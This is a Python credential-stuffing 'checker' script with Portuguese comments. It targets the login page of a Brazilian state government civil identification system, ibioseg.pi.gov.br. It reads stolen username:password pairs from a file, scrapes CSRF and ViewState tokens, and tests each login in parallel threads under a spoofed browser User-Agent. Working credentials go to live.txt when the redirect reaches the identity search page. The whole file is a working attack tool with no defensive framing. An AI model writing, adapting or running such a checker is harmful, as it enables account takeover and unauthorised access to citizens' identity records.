import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import re

# Configurações
MAX_THREADS = 5
TIMEOUT = 15
LOGINS_FILE = 'logins.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
BASE_URL = 'https://ibioseg.pi.gov.br'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print("══════════════════════════════════")
    print("      IBIOSEG-PI CHECKER")
    print("══════════════════════════════════")
    print(f" ✅ LIVE: {stats['live']}")
    print(f" ❌ DIE: {stats['die']}")
    print(f" ⚠ ERROR: {stats['error']}")
    print(f" ⏳ TEMPO: {elapsed:.2f}s")
    print("══════════════════════════════════")

def login(username, password):
    try:
        # 1. Obter sessão e tokens
        session = requests.Session()
        response = session.get(
            f"{BASE_URL}/login.xhtml",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"},
            timeout=TIMEOUT
        )

        # 2. Extrair tokens CSRF e ViewState
        csrf = re.search(r'name="_csrf" value="([^"]+)"', response.text)
        view_state = re.search(r'name="javax.faces.ViewState" value="([^"]+)"', response.text)
        
        if not csrf or not view_state:
            raise Exception("Tokens não encontrados")

        # 3. Preparar dados do login
        data = {
            "username": username,
            "password": password,
            "_csrf": csrf.group(1),
            "javax.faces.ViewState": view_state.group(1),
            "formLogin": "formLogin",
            "formLogin:btnLogin": "formLogin:btnLogin"
        }

        # 4. Enviar requisição de login
        response = session.post(
            f"{BASE_URL}/login",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Origin": BASE_URL,
                "Referer": f"{BASE_URL}/login.xhtml"
            },
            data=data,
            allow_redirects=False,
            timeout=TIMEOUT
        )

        # 5. Verificar resposta
        if response.status_code == 302 and 'FindCivilIdentification.xhtml' in response.headers.get('Location', ''):
            stats['live'] += 1
            save_result(LIVE_FILE, username, password)
            return f"[LIVE] {username}:{password}"
        else:
            stats['die'] += 1
            save_result(DIE_FILE, username, password)
            return f"[DIE] {username}:{password}"

    except Exception as e:
        stats['error'] += 1
        save_result(DIE_FILE, username, password, str(e))
        return f"[ERROR] {username}:{password} - {str(e)[:30]}"

def save_result(filename, user, password, error=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{user}:{password}"
            if error:
                line += f" | {error}"
            f.write(line + "\n")
    except Exception as e:
        print(f"Erro ao salvar resultado: {str(e)[:50]}")

def main():
    try:
        if not os.path.exists(LOGINS_FILE):
            print(f"Arquivo {LOGINS_FILE} não encontrado!")
            return

        with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line]
        
        stats['total'] = len(accounts)
        update_panel()

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(login, user, passw) for user, passw in accounts]
            
            for future in as_completed(futures):
                print(future.result())
                update_panel()

        print("\n✅ Verificação concluída!")

    except KeyboardInterrupt:
        print("\nScript interrompido pelo usuário!")
    except Exception as e:
        print(f"\nErro inesperado: {str(e)}")

if __name__ == "__main__":
    main()